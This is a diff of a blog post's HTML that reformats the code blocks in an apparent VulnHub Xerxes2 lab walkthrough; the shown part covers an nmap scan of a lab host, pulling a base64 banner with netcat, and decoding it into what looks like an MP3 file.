@@ -96,101 +96,188 @@ Yup. [#vulnhub](https://twitter.com/hashtag/vulnhub?src=hash) [#xerxes2](https:/
 
 <p>Usual stuff here, it makes sense to do some enumeration. The standard route is to start off with an NMAP scan</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# nmap -sS -T4 -O &ndash;script banner 192.168.0.102</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T4 -O --script banner 192.168.0.102
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-08-04 15:09 BST
+</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.102
+</span><span class='line'>Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">995</span> closed ports
+</span><span class='line'>PORT     STATE SERVICE
+</span><span class='line'>22/tcp   open  ssh
+</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+</span><span class='line'>80/tcp   open  http
+</span><span class='line'>111/tcp  open  rpcbind
+</span><span class='line'>4444/tcp open  krb524
+</span><span class='line'><span class="p">|</span> banner: //OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSs
+</span><span class='line'><span class="p">|</span>_uMDM1ODo9QUNG<span class="se">\x</span>0ASEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKa...
+</span><span class='line'>8888/tcp open  sun-answerbook
+</span><span class='line'>MAC Address: 08:00:27:FA:1A:A6 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
+</span><span class='line'>No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see http://nmap.org/submit/ <span class="o">)</span>.
+</span><span class='line'>TCP/IP fingerprint:
+</span><span class='line'>OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>6.46%E<span class="o">=</span>4%D<span class="o">=</span>8/4%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>33675%PV<span class="o">=</span>Y%DS<span class="o">=</span>1%DC<span class="o">=</span>D%G<span class="o">=</span>Y%M<span class="o">=</span>080027%TM
+</span><span class='line'>OS:<span class="o">=</span>53DF942E%P<span class="o">=</span>i686-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS
+</span><span class='line'>OS:<span class="o">=</span>8<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M5B4ST11NW3%O2<span class="o">=</span>M5B4ST11NW3%O3<span class="o">=</span>M5B4NNT11NW3%O4<span class="o">=</span>M5B4ST11NW3%O5<span class="o">=</span>M
+</span><span class='line'>OS:5B4ST11NW3%O6<span class="o">=</span>M5B4ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>3890%W2<span class="o">=</span>3890%W3<span class="o">=</span>3890%W4<span class="o">=</span>3890%W5<span class="o">=</span>3890%W6<span class="o">=</span>38
+</span><span class='line'>OS:90<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>3908%O<span class="o">=</span>M5B4NNSNW3%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>
+</span><span class='line'>OS:S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q
+</span><span class='line'>OS:<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A
+</span><span class='line'>OS:%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y
+</span><span class='line'>OS:%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T
+</span><span class='line'>OS:<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'>
+</span><span class='line'>OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.96 seconds
+</span><span class='line'>root@pwk:~#
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-08-04 15:09 BST
-Nmap scan report for 192.168.0.102
-Host is up (0.00032s latency).
-Not shown: 995 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
-80/tcp   open  http
-111/tcp  open  rpcbind
-4444/tcp open  krb524
-| banner: //OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSs
-|</em>uMDM1ODo9QUNG\x0ASEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKa&hellip;
-8888/tcp open  sun-answerbook
-MAC Address: 08:00:27:FA:1A:A6 (Cadmus Computer Systems)
-No exact OS matches for host (If you know what OS is running on it, see <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> ).
-TCP/IP fingerprint:
-OS:SCAN(V=6.46%E=4%D=8/4%OT=22%CT=1%CU=33675%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
-OS:=53DF942E%P=i686-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS
-OS:=8)OPS(O1=M5B4ST11NW3%O2=M5B4ST11NW3%O3=M5B4NNT11NW3%O4=M5B4ST11NW3%O5=M
-OS:5B4ST11NW3%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=38
-OS:90)ECN(R=Y%DF=Y%T=40%W=3908%O=M5B4NNSNW3%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
-OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
-OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
-OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
-OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
-OS:=40%CD=S)</p>
-
-<p>Network Distance: 1 hop</p>
-
-<p>OS detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
-Nmap done: 1 IP address (1 host up) scanned in 22.96 seconds
-root@pwk:~#[/plain]</p>
 
 <p>OK, so we have SSH, HTTP, RPC bind, 4444 and 8888. Port 4444 has returned a banner, which looks like an encoded string. We can get the full string using netcat.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# nc -nv 192.168.0.102 4444
-nc: 192.168.0.102 4444 open
-//OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSsuMDM1ODo9QUNG
-SEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKapq66ws7W4ur3Bw8bIy83Q0tXX
-2tzf4eTm6evu8PP1+Pr9AAAAOUxBTUUzLjk5cgFuAAAAAAAAAAAUQCQEdSIAAEAAAZw9c+tDPgAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/zgMQAJiwOAClPQAEKEPV6vQ80
-y3mm7PwTcTcXMesnZpqNXv3jxgVjyJ8MAAcI2DgPBxYueiIlbvfu73/y7vwn+7u7/+737u7v+6Ii
-Ilf/7u///6O7u73/6IiIjv///+7u4oYiJ/u7u98ILi573//oiVuiInvoLnvoiECguLi57u7i4oKC
-goKJUuKCgoZUu9y73wiI5Yue9wHAKAAYAMBcG4uLuHrhC0gNGRNptRqIxGIF9hY0ZCM8qOkBjB0f
-z4qGhjW3XS8TqAboGJvfwWD/84LEKjYLupm/maACFJixkWAohA3YkmgtyB3CQDRcSgRcB7AAYyKY
-AaPGy4sstmhFxWglI0GVLxFUi4cJwihomIWErHeQEghuZlE6YGi3fmJIFAyWXDxw3ZFM3dPW6e5c
-J9TGB9I0SdqBmedSdkFWdkOnL5oZm5mYGajSim9NFaka6SC7tN1IX6btnETBj5oal90kVJLSTq1W
-U6a9Ro/Vrut3QoJpKZ6bmizc86BumpN1rQnAkhKW4JOIVQ6q0th/lKggBGAGgLSsKgRLlO9qcv/z
-gsQVLLvqfCncgAGp63vV7uMMyHQFDBiFIHAAmYcCoAUAvCliDGiFVTF4tGJX0ZhZRu6SKnHyp0EE
-EEUDxggaIpJIN7n1mzpIKPmq1nVKoJJpqoKSdq0EJmtNbMk7otMUbpKQQTdJ90mNEkkltTUiigtS
-aKzaqy3dBNlJVoJKZabpMy6K0F0JitTMgi6zZdSqW1ebuxx1vUq6Cl3NqTs9b11O15qg2kMkIoER</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc -nv 192.168.0.102 4444
+</span><span class='line'>nc: 192.168.0.102 <span class="m">4444</span> open
+</span><span class='line'>//OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSsuMDM1ODo9QUNG
+</span><span class='line'>SEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKapq66ws7W4ur3Bw8bIy83Q0tXX
+</span><span class='line'>2tzf4eTm6evu8PP1+Pr9AAAAOUxBTUUzLjk5cgFuAAAAAAAAAAAUQCQEdSIAAEAAAZw9c+tDPgAA
+</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/zgMQAJiwOAClPQAEKEPV6vQ80
+</span><span class='line'>y3mm7PwTcTcXMesnZpqNXv3jxgVjyJ8MAAcI2DgPBxYueiIlbvfu73/y7vwn+7u7/+737u7v+6Ii
+</span><span class='line'>Ilf/7u///6O7u73/6IiIjv///+7u4oYiJ/u7u98ILi573//oiVuiInvoLnvoiECguLi57u7i4oKC
+</span><span class='line'>goKJUuKCgoZUu9y73wiI5Yue9wHAKAAYAMBcG4uLuHrhC0gNGRNptRqIxGIF9hY0ZCM8qOkBjB0f
+</span><span class='line'>z4qGhjW3XS8TqAboGJvfwWD/84LEKjYLupm/maACFJixkWAohA3YkmgtyB3CQDRcSgRcB7AAYyKY
+</span><span class='line'>AaPGy4sstmhFxWglI0GVLxFUi4cJwihomIWErHeQEghuZlE6YGi3fmJIFAyWXDxw3ZFM3dPW6e5c
+</span><span class='line'>J9TGB9I0SdqBmedSdkFWdkOnL5oZm5mYGajSim9NFaka6SC7tN1IX6btnETBj5oal90kVJLSTq1W
+</span><span class='line'>U6a9Ro/Vrut3QoJpKZ6bmizc86BumpN1rQnAkhKW4JOIVQ6q0th/lKggBGAGgLSsKgRLlO9qcv/z
+</span><span class='line'>gsQVLLvqfCncgAGp63vV7uMMyHQFDBiFIHAAmYcCoAUAvCliDGiFVTF4tGJX0ZhZRu6SKnHyp0EE
+</span><span class='line'>EEUDxggaIpJIN7n1mzpIKPmq1nVKoJJpqoKSdq0EJmtNbMk7otMUbpKQQTdJ90mNEkkltTUiigtS
+</span><span class='line'>aKzaqy3dBNlJVoJKZabpMy6K0F0JitTMgi6zZdSqW1ebuxx1vUq6Cl3NqTs9b11O15qg2kMkIoER
+</span><span class='line'>
+</span><span class='line'>*********************** Hundreds of lines later ****************************
+</span><span class='line'>
+</span><span class='line'>Ql1KnTmDiAWivLiumNGocdxek7ovpCS2lxTBBQjoSENSSVPTyhUhqhbhDi7hglQCqQZymkiwbIYJ
+</span><span class='line'>okFFxPwG0kxBTUUzLjk5LjWqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+</span><span class='line'>qqqqqqqqqv/zgsT3L2wV3MAJn1iqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
+</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
+</span><span class='line'>AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
+</span><span class='line'><span class="nv">qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo</span><span class="o">=</span>
+</span><span class='line'>root@pwk:~#
+</span></code></pre></td></tr></table></div></figure>
 
-<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em> Hundreds of lines later </em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>*****</p>
-
-<p>Ql1KnTmDiAWivLiumNGocdxek7ovpCS2lxTBBQjoSENSSVPTyhUhqhbhDi7hglQCqQZymkiwbIYJ
-okFFxPwG0kxBTUUzLjk5LjWqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
-qqqqqqqqqv/zgsT3L2wV3MAJn1iqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
-qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
-qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
-qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
-AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
-qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
-qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
-qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo=
-root@pwk:~# [/plain]</p>
 
 <p><img src="http://www.hencewise.com/wordpress/wp-content/uploads/wide-eyes.gif" alt="" /></p>
 
 <p>Well that was a lot more than I expected. But the = at the end screams Base64, so I need to copy the banner text into a text file (I don&rsquo;t need to show you this) and a-decrypting and hexediting I shall go.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# base64 -d in.txt > out.bin
-root@pwk:~# hexedit out.bin</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# base64 -d in.txt &gt; out.bin
+</span><span class='line'>root@pwk:~# hexedit out.bin
+</span><span class='line'>
+</span><span class='line'><span class="m">00000000</span>   FF F3 <span class="m">80</span> C4  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">49</span> 6E <span class="m">66</span>  6F <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  0F <span class="m">00</span> <span class="m">00</span> <span class="m">01</span>  .............Info.......
+</span><span class='line'><span class="m">00000018</span>   F8 <span class="m">00</span> <span class="m">01</span> 9C  3D <span class="m">00</span> <span class="m">03</span> <span class="m">06</span>  <span class="m">08</span> 0B 0D <span class="m">10</span>  <span class="m">12</span> <span class="m">15</span> <span class="m">17</span> 1A  1C 1F <span class="m">21</span> <span class="m">24</span>  <span class="m">26</span> <span class="m">29</span> 2B 2E  ....<span class="o">=</span>.............!<span class="nv">$&amp;</span><span class="o">)</span>+.
+</span><span class='line'><span class="m">00000030</span>   <span class="m">30</span> <span class="m">33</span> <span class="m">35</span> <span class="m">38</span>  3A 3D <span class="m">41</span> <span class="m">43</span>  <span class="m">46</span> <span class="m">48</span> 4B 4D  <span class="m">50</span> <span class="m">52</span> <span class="m">55</span> <span class="m">57</span>  5A 5C 5F <span class="m">61</span>  <span class="m">64</span> <span class="m">66</span> <span class="m">69</span> 6B  0358:<span class="o">=</span>ACFHKMPRUWZ<span class="se">\_</span>adfik
+</span><span class='line'><span class="m">00000048</span>   6E <span class="m">70</span> <span class="m">73</span> <span class="m">75</span>  <span class="m">78</span> 7A 7D <span class="m">81</span>  <span class="m">83</span> <span class="m">86</span> <span class="m">88</span> 8B  8D <span class="m">90</span> <span class="m">92</span> <span class="m">95</span>  <span class="m">97</span> 9A 9C 9F  A1 A4 A6 A9  npsuxz<span class="o">}</span>.................
+</span><span class='line'><span class="m">00000060</span>   AB AE B0 B3  B5 B8 BA BD  C1 C3 C6 C8  CB CD D0 D2  D5 D7 DA DC  DF E1 E4 E6  ........................
+</span><span class='line'><span class="m">00000078</span>   E9 EB EE F0  F3 F5 F8 FA  FD <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">39</span> 4C <span class="m">41</span> 4D  <span class="m">45</span> <span class="m">33</span> 2E <span class="m">39</span>  <span class="m">39</span> <span class="m">72</span> <span class="m">01</span> 6E  ............9LAME3.99r.n
+</span><span class='line'><span class="m">00000090</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">14</span> <span class="m">40</span> <span class="m">24</span> <span class="m">04</span>  <span class="m">75</span> <span class="m">22</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">40</span> <span class="m">00</span> <span class="m">01</span> 9C  3D <span class="m">73</span> EB <span class="m">43</span>  .........@<span class="nv">$.</span>u<span class="s2">&quot;..@...=s.C</span>
+</span><span class='line'><span class="s2">000000A8   3E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &gt;.......................</span>
+</span><span class='line'><span class="s2">000000C0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  FF F3 80 C4  00 26 2C 0E  .....................&amp;,.</span>
+</span><span class='line'><span class="s2">000000D8   00 29 4F 40  01 0A 10 F5  7A BD 0F 34  CB 79 A6 EC  FC 13 71 37  17 31 EB 27  .)O@....z..4.y....q7.1.&#39;</span>
+</span><span class='line'><span class="s2">000000F0   66 9A 8D 5E  FD E3 C6 05  63 C8 9F 0C  00 07 08 D8  38 0F 07 16  2E 7A 22 25  f..^....c.......8....z&quot;</span>%
+</span><span class='line'><span class="m">00000108</span>   6E F7 EE EF  7F F2 EE FC  <span class="m">27</span> FB BB BB  FF EE F7 EE  EE EF FB A2  <span class="m">22</span> <span class="m">22</span> <span class="m">57</span> FF  n.......<span class="s1">&#39;...........&quot;&quot;W.</span>
+</span><span class='line'><span class="s1">00000120   EE EF FF FF  A3 BB BB BD  FF E8 88 88  8E FF FF FF  EE EE E2 86  22 27 FB BB  ....................&quot;&#39;</span>..
+</span><span class='line'><span class="m">00000138</span>   BB DF <span class="m">08</span> 2E  2E 7B DF FF  E8 <span class="m">89</span> 5B A2  <span class="m">22</span> 7B E8 2E  7B E8 <span class="m">88</span> <span class="m">40</span>  A0 B8 B8 B9  .....<span class="o">{</span>....<span class="o">[</span>.<span class="err">&quot;</span><span class="o">{</span>..<span class="o">{</span>..@....
+</span><span class='line'><span class="m">00000150</span>   EE EE E2 E2  <span class="m">82</span> <span class="m">82</span> <span class="m">82</span> <span class="m">82</span>  <span class="m">89</span> <span class="m">52</span> E2 <span class="m">82</span>  <span class="m">82</span> <span class="m">86</span> <span class="m">54</span> BB  DC BB DF <span class="m">08</span>  <span class="m">88</span> E5 8B 9E  .........R....T.........
+</span><span class='line'><span class="m">00000168</span>   F7 <span class="m">01</span> C0 <span class="m">28</span>  <span class="m">00</span> <span class="m">18</span> <span class="m">00</span> C0  5C 1B 8B 8B  B8 7A E1 0B  <span class="m">48</span> 0D <span class="m">19</span> <span class="m">13</span>  <span class="m">69</span> B5 1A <span class="m">88</span>  ...<span class="o">(</span>....<span class="se">\.</span>...z..H...i...
+</span><span class='line'><span class="m">00000180</span>   C4 <span class="m">62</span> <span class="m">05</span> F6  <span class="m">16</span> <span class="m">34</span> <span class="m">64</span> <span class="m">23</span>  3C A8 E9 <span class="m">01</span>  8C 1D 1F CF  8A <span class="m">86</span> <span class="m">86</span> <span class="m">35</span>  B7 5D 2F <span class="m">13</span>  .b...4d#&lt;..........5.<span class="o">]</span>/.
+</span></code></pre></td></tr></table></div></figure>
 
-<p>00000000   FF F3 80 C4  00 00 00 00  00 00 00 00  00 49 6E 66  6F 00 00 00  0F 00 00 01  &hellip;&hellip;&hellip;&hellip;.Info&hellip;&hellip;.
-00000018   F8 00 01 9C  3D 00 03 06  08 0B 0D 10  12 15 17 1A  1C 1F 21 24  26 29 2B 2E  &hellip;.=&hellip;&hellip;&hellip;&hellip;.!$&amp;)+.
-00000030   30 33 35 38  3A 3D 41 43  46 48 4B 4D  50 52 55 57  5A 5C 5F 61  64 66 69 6B  0358:=ACFHKMPRUWZ_adfik
-00000048   6E 70 73 75  78 7A 7D 81  83 86 88 8B  8D 90 92 95  97 9A 9C 9F  A1 A4 A6 A9  npsuxz}&hellip;&hellip;&hellip;&hellip;&hellip;..
-00000060   AB AE B0 B3  B5 B8 BA BD  C1 C3 C6 C8  CB CD D0 D2  D5 D7 DA DC  DF E1 E4 E6  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;
-00000078   E9 EB EE F0  F3 F5 F8 FA  FD 00 00 00  39 4C 41 4D  45 33 2E 39  39 72 01 6E  &hellip;&hellip;&hellip;&hellip;9LAME3.99r.n
-00000090   00 00 00 00  00 00 00 00  14 40 24 04  75 22 00 00  40 00 01 9C  3D 73 EB 43  &hellip;&hellip;&hellip;@$.u&#8221;..@&hellip;=s.C
-000000A8   3E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  >&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;..
-000000C0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  FF F3 80 C4  00 26 2C 0E  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&amp;,.
-000000D8   00 29 4F 40  01 0A 10 F5  7A BD 0F 34  CB 79 A6 EC  FC 13 71 37  17 31 EB 27  .)O@&hellip;.z..4.y&hellip;.q7.1.&lsquo;
-000000F0   66 9A 8D 5E  FD E3 C6 05  63 C8 9F 0C  00 07 08 D8  38 0F 07 16  2E 7A 22 25  f..^&hellip;.c&hellip;&hellip;.8&hellip;.z&#8221;%
-00000108   6E F7 EE EF  7F F2 EE FC  27 FB BB BB  FF EE F7 EE  EE EF FB A2  22 22 57 FF  n&hellip;&hellip;.&rsquo;&hellip;&hellip;&hellip;..&ldquo;&#8221;W.
-00000120   EE EF FF FF  A3 BB BB BD  FF E8 88 88  8E FF FF FF  EE EE E2 86  22 27 FB BB  &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;..&rdquo;&lsquo;..
-00000138   BB DF 08 2E  2E 7B DF FF  E8 89 5B A2  22 7B E8 2E  7B E8 88 40  A0 B8 B8 B9  &hellip;..{&hellip;.[.&ldquo;{..{..@&hellip;.
-00000150   EE EE E2 E2  82 82 82 82  89 52 E2 82  82 86 54 BB  DC BB DF 08  88 E5 8B 9E  &hellip;&hellip;&hellip;R&hellip;.T&hellip;&hellip;&hellip;
-00000168   F7 01 C0 28  00 18 00 C0  5C 1B 8B 8B  B8 7A E1 0B  48 0D 19 13  69 B5 1A 88  &hellip;(&hellip;..&hellip;z..H&hellip;i&hellip;
-00000180   C4 62 05 F6  16 34 64 23  3C A8 E9 01  8C 1D 1F CF  8A 86 86 35  B7 5D 2F 13  .b&hellip;4d#&lt;&hellip;&hellip;&hellip;.5.]/.[/plain]</p>
 
